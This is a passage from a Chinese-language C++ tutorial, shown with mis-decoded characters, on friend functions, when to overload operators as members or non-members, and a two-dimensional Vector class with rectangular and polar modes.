std::cout &lt;&lt; &quot;Sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; // é“¾å¼è¾“å‡º std::cout &lt;&lt; &quot;t1 + t2 = &quot; &lt;&lt; t1 + t2 &lt;&lt; std::endl; return 0;&#125; è¾“å‡º: 1234Time t1: 3 hours, 45 minutesTime t2: 2 hours, 15 minutesSum: 6 hours, 0 minutest1 + t2 &#x3D; 6 hours, 0 minutes å¤„ç† double * Time (å‹å…ƒå‡½æ•°æ–¹å¼): åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº† Time operator*(double mult) const; ä½œä¸ºæˆå‘˜å‡½æ•°ï¼Œå¯ä»¥å¤„ç† time * double çš„æƒ…å†µï¼Œä½†ä¸èƒ½å¤„ç† double * timeã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ·»åŠ ä¸€ä¸ªéæˆå‘˜å‹å…ƒå‡½æ•°æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ åœ¨ time.h ä¸­æ·»åŠ å‹å…ƒå£°æ˜: 12345678910111213// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.h// ... existing code ...class Time &#123; // ... existing members ...public: // ... existing methods ... Time operator*(double mult) const; // å¤„ç† time * double // å‹å…ƒå‡½æ•°å¤„ç† double * time friend Time operator*(double m, const Time &amp; t); friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Time &amp; t);&#125;;// ... existing code ... åœ¨ time.cpp ä¸­æ·»åŠ å‹å…ƒå®šä¹‰: 1234567891011121314// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.cpp// ... existing code ...// å®šä¹‰å‹å…ƒå‡½æ•° operator* (double * Time)// é€šå¸¸å¯ä»¥ç®€å•åœ°è°ƒç”¨å·²æœ‰çš„æˆå‘˜å‡½æ•°ç‰ˆæœ¬Time operator*(double m, const Time &amp; t) &#123; // return t.operator*(m); // ç›´æ¥è°ƒç”¨æˆå‘˜å‡½æ•° return t * m; // æˆ–è€…æ›´ç®€æ´åœ°ä½¿ç”¨å·²é‡è½½çš„ Time * double è¿ç®—ç¬¦&#125;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Time &amp; t) &#123; os &lt;&lt; t.hours &lt;&lt; &quot; hours, &quot; &lt;&lt; t.minutes &lt;&lt; &quot; minutes&quot;; return os;&#125; ç°åœ¨ï¼Œdouble * time çš„è¿ç®—ä¹Ÿå¯ä»¥æ­£å¸¸å·¥ä½œäº†ï¼š 12345678// main.cppTime t1(2, 0);double factor = 2.5;Time product1 = t1 * factor; // è°ƒç”¨æˆå‘˜å‡½æ•° t1.operator*(factor)Time product2 = factor * t1; // è°ƒç”¨å‹å…ƒå‡½æ•° operator*(factor, t1)std::cout &lt;&lt; product1 &lt;&lt; std::endl; // è¾“å‡º: 5 hours, 0 minutesstd::cout &lt;&lt; product2 &lt;&lt; std::endl; // è¾“å‡º: 5 hours, 0 minutes æ€»ç»“: å‹å…ƒï¼ˆå‡½æ•°æˆ–ç±»ï¼‰è¢«æˆäºˆè®¿é—®å£°æ˜å…¶ä¸ºå‹å…ƒçš„ç±»çš„ç§æœ‰å’Œä¿æŠ¤æˆå‘˜çš„æƒé™ã€‚ ä½¿ç”¨ friend å…³é”®å­—åœ¨ç±»å®šä¹‰å†…éƒ¨å£°æ˜å‹å…ƒã€‚ å‹å…ƒå¯¹äºé‡è½½æŸäº›è¿ç®—ç¬¦ï¼ˆå°¤å…¶æ˜¯éœ€è¦è®¿é—®ç§æœ‰æˆå‘˜ä¸”ä¸èƒ½ä½œä¸ºæˆå‘˜å‡½æ•°çš„è¿ç®—ç¬¦ï¼Œå¦‚ &lt;&lt;ï¼‰éå¸¸æœ‰ç”¨ã€‚ å‹å…ƒä¹Ÿç”¨äºå®ç°éœ€è¦ç´§å¯†åä½œä½†åˆä¸é€‚åˆæ”¾åœ¨åŒä¸€ä¸ªç±»ä¸­çš„åŠŸèƒ½ã€‚ è™½ç„¶å‹å…ƒæ‰“ç ´äº†çº¯ç²¹çš„å°è£…ï¼Œä½†å®ƒæä¾›äº†ä¸€ç§å—æ§çš„ã€æ˜ç¡®çš„æ–¹å¼æ¥åœ¨å¿…è¦æ—¶ç»•è¿‡è®¿é—®é™åˆ¶ã€‚åº”è°¨æ…ä½¿ç”¨ï¼Œé¿å…æ»¥ç”¨ã€‚ 11.4 é‡è½½è¿ç®—ç¬¦ï¼šä½œä¸ºæˆå‘˜å‡½æ•°è¿˜æ˜¯éæˆå‘˜å‡½æ•°åœ¨é‡è½½è¿ç®—ç¬¦æ—¶ï¼Œä¸€ä¸ªå…³é”®çš„å†³å®šæ˜¯å°†å…¶å®ç°ä¸ºç±»çš„æˆå‘˜å‡½æ•°è¿˜æ˜¯éæˆå‘˜å‡½æ•°ï¼ˆé€šå¸¸æ˜¯å‹å…ƒï¼‰ã€‚è¿™ä¸ªé€‰æ‹©ä¼šå½±å“å‡½æ•°çš„è°ƒç”¨æ–¹å¼ã€å‚æ•°åˆ—è¡¨ä»¥åŠæŸäº›æƒ…å†µä¸‹çš„è¡Œä¸ºã€‚ æ ¸å¿ƒåŒºåˆ«å›é¡¾: æˆå‘˜å‡½æ•°: é€šè¿‡ç±»çš„å¯¹è±¡è°ƒç”¨ã€‚ å·¦æ“ä½œæ•°éšå¼åœ°æ˜¯è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡ï¼ˆé€šè¿‡ this æŒ‡é’ˆè®¿é—®ï¼‰ã€‚ å¯¹äºäºŒå…ƒè¿ç®—ç¬¦ï¼Œå®ƒåªéœ€è¦ä¸€ä¸ªæ˜¾å¼å‚æ•°ï¼ˆå³æ“ä½œæ•°ï¼‰ã€‚ å¯¹äºä¸€å…ƒè¿ç®—ç¬¦ï¼Œå®ƒæ²¡æœ‰æ˜¾å¼å‚æ•°ã€‚ å¯ä»¥ç›´æ¥è®¿é—®ç±»çš„ private å’Œ protected æˆå‘˜ã€‚ ç¤ºä¾‹ï¼šobj1 + obj2 è°ƒç”¨ obj1.operator+(obj2)ã€‚ éæˆå‘˜å‡½æ•°: ç‹¬ç«‹äºç±»å®šä¹‰ä¹‹å¤–ï¼ˆä½†é€šå¸¸åœ¨åŒä¸€ä¸ªå¤´æ–‡ä»¶æˆ–æºæ–‡ä»¶ä¸­ï¼‰ã€‚ æ‰€æœ‰æ“ä½œæ•°éƒ½å¿…é¡»ä½œä¸ºæ˜¾å¼å‚æ•°ä¼ é€’ã€‚ å¯¹äºäºŒå…ƒè¿ç®—ç¬¦ï¼Œå®ƒéœ€è¦ä¸¤ä¸ªæ˜¾å¼å‚æ•°ï¼ˆå·¦ã€å³æ“ä½œæ•°ï¼‰ã€‚ å¯¹äºä¸€å…ƒè¿ç®—ç¬¦ï¼Œå®ƒéœ€è¦ä¸€ä¸ªæ˜¾å¼å‚æ•°ã€‚ å¦‚æœéœ€è¦è®¿é—®ç±»çš„ private æˆ– protected æˆå‘˜ï¼Œå¿…é¡»è¢«å£°æ˜ä¸ºè¯¥ç±»çš„**å‹å…ƒ (friend)**ã€‚ ç¤ºä¾‹ï¼šobj1 + obj2 è°ƒç”¨ operator+(obj1, obj2)ã€‚ é€‰æ‹©æŒ‡å—: ä»¥ä¸‹æ˜¯ä¸€äº›é€šç”¨æŒ‡å—å’Œç‰¹å®šè¿ç®—ç¬¦çš„æƒ¯ä¾‹ï¼š å¿…é¡»æ˜¯æˆå‘˜å‡½æ•°çš„è¿ç®—ç¬¦: ä»¥ä¸‹è¿ç®—ç¬¦åªèƒ½é€šè¿‡æˆå‘˜å‡½æ•°è¿›è¡Œé‡è½½ï¼š = (èµ‹å€¼è¿ç®—ç¬¦) [] (ä¸‹æ ‡è¿ç®—ç¬¦) () (å‡½æ•°è°ƒç”¨è¿ç®—ç¬¦) -&gt; (æˆå‘˜è®¿é—®è¿ç®—ç¬¦) ä»»ä½•ç±»å‹è½¬æ¢è¿ç®—ç¬¦ (å¦‚ operator int()) é€šå¸¸ä½œä¸ºæˆå‘˜å‡½æ•°çš„è¿ç®—ç¬¦ (ä¿®æ”¹å¯¹è±¡çŠ¶æ€): å¯¹äºé‚£äº›é€šå¸¸ä¼šä¿®æ”¹å…¶å·¦æ“ä½œæ•°å¯¹è±¡çŠ¶æ€çš„è¿ç®—ç¬¦ï¼Œå°†å®ƒä»¬å®ç°ä¸ºæˆå‘˜å‡½æ•°é€šå¸¸æ›´è‡ªç„¶ã€‚è¿™åŒ…æ‹¬ï¼š å¤åˆèµ‹å€¼è¿ç®—ç¬¦: +=, -=, *=, /=, %=, &amp;=, |=, ^=, &lt;&lt;=, &gt;&gt;= ä¾‹å¦‚ï¼Œtime1 += time2; ç›´è§‚åœ°è¡¨ç¤ºä¿®æ”¹ time1ã€‚å®ç°ä¸º time1.operator+=(time2) å¾ˆåˆé€‚ã€‚ é€’å¢/é€’å‡è¿ç®—ç¬¦: ++, -- (å‰ç¼€å’Œåç¼€) ä¾‹å¦‚ï¼Œ++myCounter; æˆ– myCounter++; ä¿®æ”¹ myCounter å¯¹è±¡ã€‚ 123456789101112131415// ç¤ºä¾‹ï¼šé‡è½½ += ä½œä¸ºæˆå‘˜å‡½æ•°class Time &#123; // ... private members ...public: // ... other methods ... Time&amp; operator+=(const Time&amp; t); // è¿”å›å¼•ç”¨ä»¥æ”¯æŒé“¾å¼èµ‹å€¼&#125;;Time&amp; Time::operator+=(const Time&amp; t) &#123; // å°† t åŠ åˆ° *this å¯¹è±¡ä¸Š this-&gt;minutes += t.minutes; this-&gt;hours += t.hours + this-&gt;minutes / 60; this-&gt;minutes %= 60; return *this; // è¿”å›ä¿®æ”¹åçš„å¯¹è±¡è‡ªèº«çš„å¼•ç”¨&#125; é€šå¸¸ä½œä¸ºéæˆå‘˜å‡½æ•° (é€šå¸¸æ˜¯å‹å…ƒ) çš„è¿ç®—ç¬¦: å¯¹äºé‚£äº›ä¸ä¿®æ”¹æ“ä½œæ•°çŠ¶æ€ï¼ˆè€Œæ˜¯åˆ›å»ºä¸€ä¸ªæ–°å€¼ï¼‰æˆ–è€…éœ€è¦å¯¹ç§°å¤„ç†æ“ä½œæ•°ï¼ˆå…è®¸ä¸åŒç±»å‹çš„å·¦æ“ä½œæ•°ï¼‰çš„è¿ç®—ç¬¦ï¼Œé€šå¸¸å°†å®ƒä»¬å®ç°ä¸ºéæˆå‘˜å‡½æ•°ï¼ˆé€šå¸¸æ˜¯å‹å…ƒï¼‰ã€‚ äºŒå…ƒç®—æœ¯è¿ç®—ç¬¦: +, -, *, /, % è™½ç„¶ + ä¹Ÿå¯ä»¥ä½œä¸ºæˆå‘˜å‡½æ•°ï¼ˆå¦‚ 11.2 èŠ‚æ‰€ç¤ºï¼‰ï¼Œä½†ä½œä¸ºéæˆå‘˜å‹å…ƒå‡½æ•°å¯ä»¥æä¾›æ›´å¥½çš„å¯¹ç§°æ€§ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç±»å…è®¸ä» double åˆ° Time çš„éšå¼è½¬æ¢ï¼ˆé€šå¸¸ä¸æ¨èï¼Œä½†å¯èƒ½å­˜åœ¨ï¼‰ï¼Œé‚£ä¹ˆå‹å…ƒå‡½æ•° operator+(const Time&amp;, const Time&amp;) å¯ä»¥å¤„ç† time + timeã€time + double å’Œ double + timeï¼ˆé€šè¿‡è½¬æ¢ï¼‰ï¼Œè€Œæˆå‘˜å‡½æ•°åªèƒ½å¤„ç† time + time å’Œ time + doubleã€‚ å¯¹äºåƒ double * Time è¿™æ ·çš„æ··åˆç±»å‹è¿ç®—ï¼Œå¦‚æœæƒ³è®© double ä½œä¸ºå·¦æ“ä½œæ•°ï¼Œåˆ™å¿…é¡»ä½¿ç”¨éæˆå‘˜å‡½æ•°ï¼ˆå¦‚ 11.3 èŠ‚æ‰€ç¤ºï¼‰ã€‚ å…³ç³»è¿ç®—ç¬¦: ==, !=, &lt;, &gt;, &lt;=, &gt;= å°†å®ƒä»¬å®ç°ä¸ºéæˆå‘˜å‹å…ƒå¯ä»¥æ›´å®¹æ˜“åœ°å¤„ç†å¯¹ç§°æ€§ï¼Œå¹¶å¯èƒ½å…è®¸æ··åˆç±»å‹çš„æ¯”è¾ƒï¼ˆå¦‚æœå®šä¹‰äº†é€‚å½“çš„è½¬æ¢æˆ–é‡è½½ç‰ˆæœ¬ï¼‰ã€‚ ä½è¿ç®—ç¬¦: &amp;, |, ^ é€»è¾‘è¿ç®—ç¬¦: &amp;&amp;, || (è¾ƒå°‘é‡è½½) è¾“å…¥/è¾“å‡ºè¿ç®—ç¬¦: &lt;&lt;, &gt;&gt; å¿…é¡»æ˜¯éæˆå‘˜å‡½æ•°ï¼Œå› ä¸ºå·¦æ“ä½œæ•°æ˜¯ ostream æˆ– istream å¯¹è±¡ï¼Œè€Œä¸æ˜¯ä½ çš„ç±»çš„å¯¹è±¡ã€‚å®ƒä»¬å‡ ä¹æ€»æ˜¯éœ€è¦æˆä¸ºå‹å…ƒä»¥è®¿é—®ç§æœ‰æ•°æ®è¿›è¡Œè¯»å†™ã€‚ 123456789101112// ç¤ºä¾‹ï¼šé‡è½½ == ä½œä¸ºéæˆå‘˜å‹å…ƒå‡½æ•°class Time &#123; // ... private members ...public: // ... methods ... friend bool operator==(const Time&amp; t1, const Time&amp; t2); // ... other friends ...&#125;;bool operator==(const Time&amp; t1, const Time&amp; t2) &#123; return (t1.hours == t2.hours &amp;&amp; t1.minutes == t2.minutes);&#125; æ€»ç»“: è¿ç®—ç¬¦ç±»å‹ æ¨èå®ç°æ–¹å¼ åŸå›  =, [], (), -&gt;, type() å¿…é¡»æ˜¯æˆå‘˜å‡½æ•° C++ è¯­è¨€è§„å®š +=, -=, *=, etc. æˆå‘˜å‡½æ•° é€šå¸¸ä¿®æ”¹å·¦æ“ä½œæ•°å¯¹è±¡çš„çŠ¶æ€ ++, -- æˆå‘˜å‡½æ•° ä¿®æ”¹å¯¹è±¡çŠ¶æ€ +, -, *, /, % éæˆå‘˜å‹å…ƒ (æˆ–æˆå‘˜) å¯¹ç§°æ€§ï¼Œå…è®¸æ··åˆç±»å‹å·¦æ“ä½œæ•° (å¦‚æœéœ€è¦)ï¼Œé€šå¸¸ä¸ä¿®æ”¹æ“ä½œæ•° ==, !=, &lt;, &gt;, &lt;=, &gt;= éæˆå‘˜å‹å…ƒ (æˆ–æˆå‘˜) å¯¹ç§°æ€§ &lt;&lt;, &gt;&gt; å¿…é¡»æ˜¯éæˆå‘˜å‹å…ƒ å·¦æ“ä½œæ•°æ˜¯æµå¯¹è±¡ (ostream, istream)ï¼Œéœ€è¦è®¿é—®ç§æœ‰æˆå‘˜ ä¸€å…ƒ +, -, *, &amp;, !, ~ æˆå‘˜æˆ–éæˆå‘˜å‹å…ƒ æˆå‘˜å‡½æ•°æ— å‚æ•°ï¼Œéæˆå‘˜å‡½æ•°ä¸€ä¸ªå‚æ•° é€‰æ‹©ä¾æ®: å¼ºåˆ¶è¦æ±‚: æŸäº›è¿ç®—ç¬¦å¿…é¡»æ˜¯æˆå‘˜å‡½æ•°ã€‚ å·¦æ“ä½œæ•°ç±»å‹: å¦‚æœå·¦æ“ä½œæ•°å¿…é¡»æ˜¯ç‰¹å®šç±»å‹ï¼ˆå¦‚ ostreamï¼‰ï¼Œåˆ™å¿…é¡»ä½¿ç”¨éæˆå‘˜å‡½æ•°ã€‚ çŠ¶æ€ä¿®æ”¹: å¦‚æœè¿ç®—ç¬¦ä¸»è¦ç›®çš„æ˜¯ä¿®æ”¹å·¦æ“ä½œæ•°çš„çŠ¶æ€ï¼Œæˆå‘˜å‡½æ•°é€šå¸¸æ›´è‡ªç„¶ã€‚ å¯¹ç§°æ€§/ç±»å‹è½¬æ¢: å¦‚æœå¸Œæœ›è¿ç®—ç¬¦å¯¹æ“ä½œæ•°é¡ºåºå…·æœ‰å¯¹ç§°æ€§ï¼Œæˆ–è€…å¸Œæœ›å…è®¸å¯¹å·¦æ“ä½œæ•°è¿›è¡Œéšå¼ç±»å‹è½¬æ¢ï¼ˆéœ€è°¨æ…ï¼‰ï¼Œéæˆå‘˜å‡½æ•°ï¼ˆé€šå¸¸æ˜¯å‹å…ƒï¼‰æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚ åœ¨å®è·µä¸­ï¼Œå¯¹äºå¸¸è§çš„äºŒå…ƒè¿ç®—ç¬¦å¦‚ +, -, *, /ï¼Œä¸€ç§å¸¸è§çš„æ¨¡å¼æ˜¯ï¼š å°†å¤åˆèµ‹å€¼è¿ç®—ç¬¦ï¼ˆå¦‚ +=, -=ï¼‰å®ç°ä¸ºæˆå‘˜å‡½æ•°ã€‚ å°†å¯¹åº”çš„äºŒå…ƒè¿ç®—ç¬¦ï¼ˆå¦‚ +, -ï¼‰å®ç°ä¸ºéæˆå‘˜å‹å…ƒå‡½æ•°ï¼Œå¹¶åœ¨å…¶å†…éƒ¨è°ƒç”¨å¤åˆèµ‹å€¼è¿ç®—ç¬¦æ¥å®Œæˆå®é™…å·¥ä½œã€‚ 1234567891011121314151617181920// ç¤ºä¾‹æ¨¡å¼class Time &#123; // ...public: Time&amp; operator+=(const Time&amp; t); // æˆå‘˜å‡½æ•° friend Time operator+(const Time&amp; t1, const Time&amp; t2); // éæˆå‘˜å‹å…ƒ // ...&#125;;Time&amp; Time::operator+=(const Time&amp; t) &#123; // ... å®ç° += é€»è¾‘ ... return *this;&#125;// operator+ è°ƒç”¨ operator+=Time operator+(const Time&amp; t1, const Time&amp; t2) &#123; Time sum = t1; // åˆ›å»ºä¸€ä¸ªå‰¯æœ¬ sum += t2; // ä½¿ç”¨æˆå‘˜å‡½æ•° += return sum; // è¿”å›ç»“æœ&#125; è¿™ç§æ¨¡å¼å¯ä»¥å‡å°‘ä»£ç é‡å¤ã€‚ 11.5 å†è¯»é‡è½½ï¼šä¸€ä¸ªçŸ¢é‡ç±»æœ¬èŠ‚æˆ‘ä»¬å°†é€šè¿‡å®šä¹‰ä¸€ä¸ªè¡¨ç¤ºäºŒç»´çŸ¢é‡ï¼ˆæˆ–å‘é‡ï¼‰çš„ç±»ï¼Œè¿›ä¸€æ­¥æ¢è®¨è¿ç®—ç¬¦é‡è½½çš„åº”ç”¨ã€‚çŸ¢é‡æ—¢å¯ä»¥ç”¨ç›´è§’åæ ‡ (x, y) è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ç”¨æåæ ‡ (å¤§å°/æ¨¡, è§’åº¦) è¡¨ç¤ºã€‚æˆ‘ä»¬çš„ Vector ç±»å°†èƒ½å¤Ÿå­˜å‚¨è¿™ä¸¤ç§è¡¨ç¤ºï¼Œå¹¶å…è®¸ç”¨æˆ·åœ¨å®ƒä»¬ä¹‹é—´åˆ‡æ¢ã€‚ 11.5.1 ä½¿ç”¨çŠ¶æ€æˆå‘˜ä¸ºäº†åŒæ—¶æ”¯æŒç›´è§’åæ ‡å’Œæåæ ‡ï¼Œæˆ‘ä»¬çš„ Vector ç±»éœ€è¦åŒ…å«ç›¸åº”çš„æˆå‘˜ï¼š x: x åˆ†é‡ y: y åˆ†é‡ mag: çŸ¢é‡çš„å¤§å°ï¼ˆæ¨¡ï¼‰ ang: çŸ¢é‡çš„è§’åº¦ åŒæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªçŠ¶æ€æˆå‘˜æ¥æŒ‡ç¤ºå½“å‰å¯¹è±¡æ˜¯ä»¥å“ªç§æ¨¡å¼è¡¨ç¤ºçš„ï¼ˆç›´è§’åæ ‡æˆ–æåæ ‡ï¼‰ï¼Œä»¥åŠä¸€äº›æ–¹æ³•æ¥æ ¹æ®ä¸€ç§è¡¨ç¤ºè®¡ç®—å¦ä¸€ç§è¡¨ç¤ºã€‚ vector.h (ç±»å®šä¹‰) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// filepath: d:\\ProgramData\\files_Cpp\\250424\\vector.h#ifndef VECTOR_H_#define VECTOR_H_#include &lt;iostream&gt;namespace VECTOR &#123; // å°†ç±»æ”¾å…¥å‘½åç©ºé—´ class Vector &#123; public: // æšä¸¾ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºæ¨¡å¼ï¼šç›´è§’åæ ‡(RECT) æˆ– æåæ ‡(POL) enum Mode &#123;RECT, POL&#125;; private: double x; // x åˆ†é‡ double y; // y åˆ†é‡ double mag; // çŸ¢é‡çš„å¤§å° (æ¨¡) double ang; // çŸ¢é‡çš„è§’åº¦ (å¼§åº¦) Mode mode; // å½“å‰æ¨¡å¼ (RECT æˆ– POL) // ç§æœ‰è¾…åŠ©å‡½æ•°ï¼Œç”¨äºæ ¹æ®ä¸€ç§è¡¨ç¤ºè®¡ç®—å¦ä¸€ç§è¡¨ç¤º void set_mag(); // æ ¹æ® x, y è®¡ç®— mag void set_ang(); // æ ¹æ® x, y è®¡ç®— ang (å¼§åº¦) void set_x(); // æ ¹æ® mag, ang è®¡ç®— x void set_y(); // æ ¹æ® mag, ang è®¡ç®— y public: // æ„é€ å‡½æ•° Vector(); // é»˜è®¤æ„é€ å‡½æ•° // æ ¹æ®æŒ‡å®šæ¨¡å¼å’Œå€¼æ„é€  Vector(double n1, double n2, Mode form = RECT); // é‡ç½®çŸ¢é‡ void reset(double n1, double n2, Mode form = RECT); ~Vector(); // ææ„å‡½æ•° // è·å–å„åˆ†é‡çš„å€¼ double xval() const &#123; return x; &#125; double yval() const &#123; return y; &#125; double magval() const &#123; return mag; &#125; double angval() const &#123; // è¿”å›è§’åº¦ (åº¦) // å°†å¼§åº¦è½¬æ¢ä¸ºåº¦ if (ang == 0.0 &amp;&amp; x == 0.0 &amp;&amp; y == 0.0) return 0.0; // å¤„ç†é›¶å‘é‡ else if (ang == 0.0 &amp;&amp; x &gt; 0.0) return 0.0; // xè½´æ­£æ–¹å‘ else if (ang == 0.0 &amp;&amp; x &lt; 0.0) return 180.0; // xè½´è´Ÿæ–¹å‘ (atan2ä¼šå¤„ç†) else return ang * 180.0 / 3.141592653589793; // å‡è®¾ M_PI ä¸å¯ç”¨ &#125; // è®¾ç½®æ¨¡å¼ void polar_mode(); // è®¾ç½®ä¸ºæåæ ‡æ¨¡å¼ void rect_mode(); // è®¾ç½®ä¸ºç›´è§’åæ ‡æ¨¡å¼ // --- è¿ç®—ç¬¦é‡è½½ --- // åŠ æ³•: Vector + Vector Vector operator+(const Vector &amp; b) const; // å‡æ³•: Vector - Vector Vector operator-(const Vector &amp; b) const; // å–å: -Vector Vector operator-() const; // ä¹˜æ³•: double * Vector (å‹å…ƒ) æˆ– Vector * double (æˆå‘˜æˆ–å‹å…ƒ) Vector operator*(double n) const; // --- å‹å…ƒå‡½æ•° --- // ä¹˜æ³•: double * Vector friend Vector operator*(double n, const Vector &amp; a); // è¾“å‡º: cout &lt;&lt; Vector friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Vector &amp; v); &#125;;&#125; // namespace VECTOR#endif // VECTOR_H_ vector.cpp (ç±»å®ç°) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129// filepath: d:\\ProgramData\\files_Cpp\\250424\\vector.cpp#include &lt;cmath&gt; // ä¸ºäº†ä½¿ç”¨ sqrt, atan, atan2, sin, cos#include &quot;vector.h&quot; // åŒ…å«ç±»å®šä¹‰namespace VECTOR &#123; // è§’åº¦è½¬æ¢å¸¸é‡ (å¦‚æœ cmath æ²¡æœ‰å®šä¹‰ M_PI) const double Rad_to_deg = 180.0 / 3.141592653589793; // --- ç§æœ‰è¾…åŠ©å‡½æ•° --- void Vector::set_mag() &#123; mag = std::sqrt(x * x + y * y); &#125; void Vector::set_ang() &#123; if (x == 0.0 &amp;&amp; y == 0.0) ang = 0.0; else ang = std::atan2(y, x); // atan2 å¤„ç†æ‰€æœ‰è±¡é™ &#125; void Vector::set_x() &#123; x = mag * std::cos(ang); &#125; void Vector::set_y() &#123; y = mag * std::sin(ang); &#125; // --- å…¬æœ‰æ–¹æ³• --- Vector::Vector() &#123; // é»˜è®¤æ„é€ å‡½æ•° x = y = mag = ang = 0.0; mode = RECT; &#125; // æ ¹æ®æ¨¡å¼æ„é€  Vector::Vector(double n1, double n2, Mode form) &#123; mode = form; if (form == RECT) &#123; x = n1; y = n2; set_mag(); set_ang(); &#125; else if (form == POL) &#123; mag = n1; ang = n2 / Rad_to_deg; // å°†è§’åº¦è½¬æ¢ä¸ºå¼§åº¦ set_x(); set_y(); &#125; else &#123; std::cerr &lt;&lt; &quot;Incorrect 3rd argument to Vector() -- &quot;; std::cerr &lt;&lt; &quot;vector set to 0\\n&quot;; x = y = mag = ang = 0.0; mode = RECT; &#125; &#125; // é‡ç½®çŸ¢é‡ void Vector::reset(double n1, double n2, Mode form) &#123; mode = form; if (form == RECT) &#123; x = n1; y = n2; set_mag(); set_ang(); &#125; else if (form == POL) &#123; mag = n1; ang = n2 / Rad_to_deg; // è§’åº¦è½¬å¼§åº¦ set_x(); set_y(); &#125; else &#123; std::cerr &lt;&lt; &quot;Incorrect 3rd argument to Vector::reset() -- &quot;; std::cerr &lt;&lt; &quot;vector set to 0\\n&quot;; x = y = mag = ang = 0.0; mode = RECT; &#125; &#125; Vector::~Vector() &#123; // ææ„å‡½æ•° &#125; void Vector::polar_mode() &#123; mode = POL; &#125; void Vector::rect_mode() &#123; mode = RECT; &#125; // --- è¿ç®—ç¬¦é‡è½½å®ç° --- // åŠ æ³• (é€šå¸¸åœ¨ç›´è§’åæ ‡ä¸‹è®¡ç®—) Vector Vector::operator+(const Vector &amp; b) const &#123; return Vector(x + b.x, y + b.y); // è¿”å›ä¸€ä¸ªæ–°çš„ Vector å¯¹è±¡ &#125; // å‡æ³• Vector Vector::operator-(const Vector &amp; b) const &#123; return Vector(x - b.x, y - b.y); &#125; // å–å Vector Vector::operator-() const &#123; return Vector(-x, -y); &#125; // ä¹˜æ³• (Vector * double) Vector Vector::operator*(double n) const &#123; return Vector(x * n, y * n); &#125; // --- å‹å…ƒå‡½æ•°å®ç° --- // ä¹˜æ³• (double * Vector) Vector operator*(double n, const Vector &amp; a) &#123; return a * n; // è°ƒç”¨æˆå‘˜å‡½æ•° a.operator*(n) &#125; // è¾“å‡º (æ ¹æ®æ¨¡å¼é€‰æ‹©è¾“å‡ºæ ¼å¼) std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Vector &amp; v) &#123; if (v.mode == Vector::RECT) &#123; os &lt;&lt; &quot;(x,y) = (&quot; &lt;&lt; v.x &lt;&lt; &quot;, &quot; &lt;&lt; v.y &lt;&lt; &quot;)&quot;; &#125; else if (v.mode == Vector::POL) &#123; os &lt;&lt; &quot;(m,a) = (&quot; &lt;&lt; v.mag &lt;&lt; &quot;, &quot; &lt;&lt; v.ang * Rad_to_deg &lt;&lt; &quot;)&quot;; // è¾“å‡ºè§’åº¦ &#125; else &#123; os &lt;&lt; &quot;Vector object mode is invalid&quot;; &#125; return os; &#125;&#125; // end namespace VECTOR 11.5.2 ä¸º Vector ç±»é‡è½½ç®—æœ¯è¿ç®—ç¬¦æˆ‘ä»¬åœ¨ä¸Šé¢çš„ä»£ç ä¸­å·²ç»å®ç°äº†å‡ ä¸ªè¿ç®—ç¬¦çš„é‡è½½ï¼š operator+: ä¸¤ä¸ª Vector ç›¸åŠ ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„ Vectorã€‚è®¡ç®—åœ¨ç›´è§’åæ ‡ä¸‹è¿›è¡Œã€‚ operator-: ä¸¤ä¸ª Vector ç›¸å‡ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„ Vectorã€‚ operator- (ä¸€å…ƒ): å¯¹ Vector å–åï¼Œè¿”å›ä¸€ä¸ªæ–°çš„ Vectorã€‚ operator*: Vector ä¹˜ä»¥ä¸€ä¸ª doubleï¼Œè¿”å›ä¸€ä¸ªæ–°çš„ Vectorã€‚ operator* (å‹å…ƒ): double ä¹˜ä»¥ä¸€ä¸ª Vectorï¼Œé€šè¿‡è°ƒç”¨æˆå‘˜å‡½æ•°ç‰ˆæœ¬å®ç°ã€‚ operator&lt;&lt; (å‹å…ƒ): å°† Vector è¾“å‡ºåˆ° ostreamï¼Œæ ¹æ®å½“å‰æ¨¡å¼é€‰æ‹©è¾“å‡ºæ ¼å¼ã€‚ 11.5.3 å¯¹å®ç°çš„è¯´æ˜ å‘½åç©ºé—´: å°† Vector ç±»åŠå…¶ç›¸å…³å‡½æ•°æ”¾å…¥ VECTOR å‘½åç©ºé—´ï¼Œä»¥é¿å…æ½œåœ¨çš„åç§°å†²çªã€‚ åæ ‡è®¡ç®—: ç®—æœ¯è¿ç®—ï¼ˆåŠ ã€å‡ã€ä¹˜ï¼‰é€šå¸¸åœ¨ç›´è§’åæ ‡ä¸‹æ‰§è¡Œæ›´ç®€å•ã€‚å³ä½¿å¯¹è±¡æ˜¯ä»¥æåæ ‡æ¨¡å¼åˆ›å»ºæˆ–è®¾ç½®çš„ï¼Œå†…éƒ¨çš„ x å’Œ y å€¼ä¹Ÿä¼šè¢«è®¡ç®—å‡ºæ¥ï¼Œè¿ç®—åŸºäºè¿™äº›å€¼è¿›è¡Œã€‚ç»“æœå¯¹è±¡é»˜è®¤ä»¥ç›´è§’åæ ‡æ¨¡å¼åˆ›å»ºï¼Œä½†å…¶ mag å’Œ ang ä¹Ÿä¼šè¢«è®¡ç®—ã€‚ è§’åº¦å•ä½: å†…éƒ¨è®¡ç®—ï¼ˆå¦‚ sin, cos, atan2ï¼‰ä½¿ç”¨å¼§åº¦ã€‚æ„é€ å‡½æ•°å’Œ reset 